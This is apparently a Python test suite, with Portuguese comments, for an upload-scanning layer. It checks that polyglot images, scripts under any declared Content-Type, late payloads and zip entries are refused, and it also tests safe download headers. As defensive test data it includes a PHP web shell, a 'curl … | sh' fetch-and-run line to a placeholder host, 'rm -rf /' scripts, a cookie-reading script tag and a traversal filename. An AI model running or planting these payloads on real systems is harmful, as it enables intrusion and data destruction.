"""Item L7-03-b-antivirus-anexos, conserto de 06/09/2026 (refutação do adversário, handoff T3, achados 22-25):
polyglot imagem+script, `Content-Type` desconhecido/genérico desligando a varredura, carga além dos 8 KiB e
zip/kmz não aberto. Cada teste aqui é a prova de uma das quatro brechas fechadas, mais as provas de que o
conserto NÃO reprova conteúdo legítimo — em especial binário aleatório sob `application/octet-stream`, que é
o que a suíte de `tests/api/test_arquivos.py` envia de verdade.

Regra da casa (P5, reprodutível): nenhuma checagem desta camada pode depender do rótulo que o `libmagic` dá a
bytes aleatórios (MEDIDO: ~0,9% deles saem como algo diferente de `application/octet-stream`). Por isso os
testes de aceitação abaixo rodam muitas amostras — se alguém trocar a regra determinística por um palpite, eles
passam a falhar de vez em quando, que é o sinal combinado."""

import io
import os
import struct
import zipfile
import zlib

import pytest

from app.entrega_conteudo import cabecalhos_de_anexo, nome_saneado, tipo_de_entrega
from app.varredura_conteudo import (
    ConteudoRecusado,
    cauda,
    escanear_cabecalho,
    escanear_continuacao,
)

GIF_LIMPO = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)
JPEG_LIMPO = bytes.fromhex("ffd8ffe000104a46494600010100000100010000") + b"\xff\xd9"


def _png_limpo() -> bytes:
    """PNG mínimo COMPLETO: assinatura + IHDR + IEND (é o IEND que dá o fim do formato)."""
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr) & 0xFFFFFFFF)
        + struct.pack(">I", 0)
        + b"IEND"
        + struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    )


def _recusado(dados: bytes, content_type: str) -> str:
    with pytest.raises(ConteudoRecusado) as exc:
        escanear_cabecalho(dados, content_type)
    return str(exc.value)


# ---------------------------------------------------------------- 1. polyglot: imagem válida + carga colada
@pytest.mark.parametrize(
    "nome,dados",
    [
        ("gif+script", GIF_LIMPO + b"<script>alert(1)</script>"),
        ("jpeg+shell", JPEG_LIMPO + b"\n#!/bin/sh\ncurl http://exemplo.invalido | sh\n"),
        ("png+php", _png_limpo() + b"<?php system($_GET['c']); ?>"),
    ],
)
def test_imagem_valida_com_carga_colada_depois_e_recusada(nome, dados):
    tipo = {"gif": "image/gif", "jpe": "image/jpeg", "png": "image/png"}[nome[:3]]
    motivo = _recusado(dados, tipo)
    assert "carga executável" in motivo or "depois do fim do formato" in motivo, motivo


def test_imagem_limpa_do_mesmo_formato_continua_aceita():
    """O outro lado do teste acima: sem a carga, as MESMAS três imagens passam (senão a regra só sabe recusar)."""
    for dados, tipo in ((GIF_LIMPO, "image/gif"), (JPEG_LIMPO, "image/jpeg"), (_png_limpo(), "image/png")):
        assert escanear_cabecalho(dados, tipo).permitido is True


def test_byte_a_mais_depois_do_fim_do_formato_e_recusado_mesmo_sem_carga_conhecida():
    """A regra estrutural sozinha: um único byte inofensivo depois do IEND/EOI/trailer já denuncia o disfarce
    (nenhum dos padrões de carga aparece nestes bytes)."""
    for dados, tipo in (
        (_png_limpo() + b"\x41", "image/png"),
        (JPEG_LIMPO + b"\x41", "image/jpeg"),
        (GIF_LIMPO + b"\x41", "image/gif"),
    ):
        assert "depois do fim do formato" in _recusado(dados, tipo)


# ---------------------------------------------------------------- 2. tipo declarado nunca desliga a varredura
@pytest.mark.parametrize(
    "declarado",
    ["", "text/plain", "text/html", "application/x-inventado", "application/octet-stream", "APPLICATION/PDF"],
)
def test_script_e_recusado_sob_qualquer_content_type_declarado(declarado):
    assert _recusado(b"#!/bin/sh\nrm -rf /\n", declarado)


@pytest.mark.parametrize("declarado", ["", "application/octet-stream", "application/x-inventado"])
def test_executavel_elf_e_pe_sao_recusados_sob_tipo_generico_ou_desconhecido(declarado):
    elf = b"\x7fELF\x02\x01\x01" + b"\x00" * 4096
    pe = bytearray(b"MZ" + b"\x00" * 4096)
    pe[0x3C:0x40] = (0x80).to_bytes(4, "little")
    pe[0x80:0x84] = b"PE\x00\x00"
    assert "ELF" in _recusado(elf, declarado)
    assert "PE" in _recusado(bytes(pe), declarado)


def test_html_com_script_e_recusado_mesmo_declarado_como_html():
    assert _recusado(b"<html><body><script>document.cookie</script></body></html>", "text/html")


# ---------------------------------------------------------------- 3. corpo inteiro, não só o cabeçalho
def test_carga_muito_depois_do_cabecalho_e_encontrada():
    """CSV legítimo de ~9 KiB (acima de CABECALHO_BYTES) com shebang no fim: a busca de carga varre tudo que o
    chamador entrega, não só os 8 KiB que o libmagic precisa."""
    dados = b"a,b\n" + b"1,2\n" * 2200 + b"#!/bin/sh\nrm -rf /\n"
    assert len(dados) > 8192
    assert "carga executável" in _recusado(dados, "text/csv")


def test_csv_grande_e_limpo_continua_aceito():
    dados = b"a,b\n" + b"1,2\n" * 5000
    assert escanear_cabecalho(dados, "text/csv").permitido is True


def test_continuacao_de_bloco_recusa_carga_e_a_emenda_entre_blocos_nao_deixa_escapar():
    """Caminho multipart: a carga que chega numa parte SEGUINTE é recusada, e um padrão partido exatamente na
    costura entre dois blocos (`#!/bi` no fim de um, `n/sh` no começo do outro) também."""
    limpo = b"0" * 1000
    assert escanear_continuacao(limpo, cauda(limpo)) == limpo[-32:]
    with pytest.raises(ConteudoRecusado):
        escanear_continuacao(b"x" * 100 + b"#!/bin/sh\n", b"")
    bloco1 = b"0" * 100 + b"#!/bi"
    bloco2 = b"n/sh\necho x\n" + b"0" * 100
    with pytest.raises(ConteudoRecusado):
        escanear_continuacao(bloco2, cauda(bloco1))


# ---------------------------------------------------------------- 4. contêiner composto (zip/kmz)
def _zip(nomes_e_conteudos: dict[str, bytes], compressao: int = zipfile.ZIP_STORED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compressao) as z:
        for nome, dados in nomes_e_conteudos.items():
            z.writestr(nome, dados)
    return buf.getvalue()


def test_zip_com_entrada_de_extensao_executavel_e_recusado():
    for nome in ("carga.sh", "pasta/carga.exe", "macro.js", "instalador.msi"):
        motivo = _recusado(_zip({nome: b"conteudo qualquer"}), "application/vnd.google-earth.kmz")
        assert nome in motivo


def test_zip_com_entrada_sem_extensao_mas_com_shebang_e_recusado():
    """Entrada COMPRIMIDA (deflate) e sem extensão: os bytes do script não aparecem literalmente no pacote, então
    quem tem de pegar é a abertura da lista de entradas, não a busca de carga no corpo."""
    dados = _zip({"doc/roda": b"#!/bin/sh\n" + b"echo oi\n" * 500}, zipfile.ZIP_DEFLATED)
    assert b"#!/bin/" not in dados
    assert "shebang" in _recusado(dados, "application/zip")


def test_kmz_legitimo_continua_aceito():
    kml = b"<?xml version='1.0'?><kml xmlns='http://www.opengis.net/kml/2.2'><Document/></kml>"
    dados = _zip({"doc.kml": kml, "arquivos/icone.png": _png_limpo()})
    assert escanear_cabecalho(dados, "application/vnd.google-earth.kmz").permitido is True


# ---------------------------------------------------------------- o que NÃO pode ser recusado (P5)
def test_binario_aleatorio_declarado_octet_stream_continua_aceito():
    """A armadilha registrada no módulo: o `libmagic` chama ~0,9% dos blocos aleatórios de outra coisa (às vezes
    `application/x-dosexec`). Nenhuma regra desta camada pode depender disso — 300 amostras, todas aceitas."""
    for _ in range(300):
        assert escanear_cabecalho(os.urandom(4096), "application/octet-stream").permitido is True


def test_binario_aleatorio_declarado_text_plain_continua_aceito():
    """O que `tests/api/test_arquivos.py::test_api_enviar_ler_apagar_por_token` envia de verdade: 2 KiB de
    `os.urandom` sob `text/plain` (tipo fora da tabela de famílias). Rigor máximo não pode virar recusa cega."""
    for _ in range(100):
        assert escanear_cabecalho(os.urandom(2048), "text/plain").permitido is True


def test_texto_comum_e_json_continuam_aceitos():
    assert escanear_cabecalho("relatório com acentuação, ç e ã\n".encode() * 50, "text/plain").permitido is True
    assert escanear_cabecalho(b'{"type": "FeatureCollection", "features": []}', "application/geo+json").permitido


# ---------------------------------------------------------------- entrega segura (2ª metade do item)
def test_tipo_de_entrega_rebaixa_tudo_que_nao_esta_no_vocabulario():
    assert tipo_de_entrega("text/html") == "application/octet-stream"
    assert tipo_de_entrega("image/svg+xml") == "application/octet-stream"
    assert tipo_de_entrega("application/xhtml+xml") == "application/octet-stream"
    assert tipo_de_entrega("text/javascript") == "application/octet-stream"
    assert tipo_de_entrega("application/x-inventado") == "application/octet-stream"
    assert tipo_de_entrega(None) == "application/octet-stream"
    assert tipo_de_entrega("image/png") == "image/png"
    assert tipo_de_entrega("application/pdf; charset=x") == "application/pdf"


def test_nome_de_anexo_saneado_e_cabecalho_nas_duas_formas_da_rfc():
    assert nome_saneado('rela"tório/../etc/passwd', "png") == "rela_tório_.._etc_passwd.png"
    h = cabecalhos_de_anexo(nome_saneado("relatório anual", "csv"))
    assert h["X-Content-Type-Options"] == "nosniff"
    assert h["Content-Disposition"].startswith('attachment; filename="relat_rio anual.csv"')
    assert "filename*=UTF-8''relat%C3%B3rio%20anual.csv" in h["Content-Disposition"]
    assert '"' not in h["Content-Disposition"].split("filename*=")[1]
